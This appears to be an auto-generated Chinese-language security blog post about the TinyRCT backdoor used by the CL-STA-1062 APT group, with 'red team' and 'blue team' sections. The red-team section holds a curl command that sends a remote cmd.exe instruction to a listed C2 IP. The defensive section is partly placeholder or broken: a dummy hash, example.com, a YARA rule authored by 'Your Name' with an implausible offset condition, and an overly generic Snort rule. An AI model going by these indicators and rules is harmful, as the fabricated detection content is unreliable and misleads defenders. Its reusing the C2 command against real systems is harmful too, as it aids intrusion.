---
layout: post
title:  "Chinese-Speaking APT Deploys New TinyRCT Backdoor in Southeast Asia Campaign"
date:   2026-06-26 19:39:37 +0000
categories: [security]
severity: critical
---

# 🚨 解析 CL-STA-1062 進階持續威脅（APT）群體的 TinyRCT 後門

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 遠端命令執行（RCE）與資料外洩
> * **關鍵技術**: 自訂後門（TinyRCT）、AppDomainManager 注入攻擊、AES-128 加密

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: CL-STA-1062 群體利用自訂的 TinyRCT 後門進行遠端命令執行和資料外洩。這個後門可以運行任意命令、列舉檔案、外洩檔案、捕捉螢幕畫面和刪除自己。
* **攻擊流程圖解**:
  1. 攻擊者透過 ASPX 網頁殼（Web Shell）進行初始偵查和外部請求。
  2. 部署 TinyRCT 後門，建立持續的通信通道。
  3. 使用 AES-128 加密進行資料交換。
* **受影響元件**: Southeast Asia 的政府實體和關鍵基礎設施，特別是能源和政府部門。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有網路存取權限和特定的漏洞。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload 結構
      payload = {
        "command": "run",
        "args": ["cmd.exe", "/c", "whoami"]
      }
    
    ```
  *範例指令*: 使用 `curl` 發送 POST 請求到 C2 伺服器。

```

bash
  curl -X POST -H "Content-Type: application/json" -d '{"command": "run", "args": ["cmd.exe", "/c", "whoami"]}' http://45.32.113.172

```
* **繞過技術**: 使用 AppDomainManager 注入攻擊來繞過防護機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 45.32.113.172 | example.com | C:\Windows\Temp\PerfWatson2.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule TinyRCT {
        meta:
          description = "Detects TinyRCT backdoor"
          author = "Your Name"
        strings:
          $a = "PerfWatson2.exe"
        condition:
          $a at 0
      }
    
    ```
  或者是使用 Snort/Suricata Signature：

```

snort
  alert tcp any any -> any any (msg:"TinyRCT backdoor detected"; content:"PerfWatson2.exe"; sid:1000001; rev:1;)

```
* **緩解措施**: 更新系統和應用程式至最新版本，使用防毒軟體和入侵偵測系統。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **AppDomainManager 注入攻擊**: 一種利用 .NET 的 AppDomainManager 來注入惡意程式碼的攻擊技術。
* **AES-128 加密**: 一種高安全性的加密演算法，使用 128 位元的金鑰。
* **自訂後門 (Custom Backdoor)**: 一種為特定攻擊者設計的後門程式，通常具有遠端命令執行和資料外洩的功能。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/chinese-speaking-apt-deploys-new.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


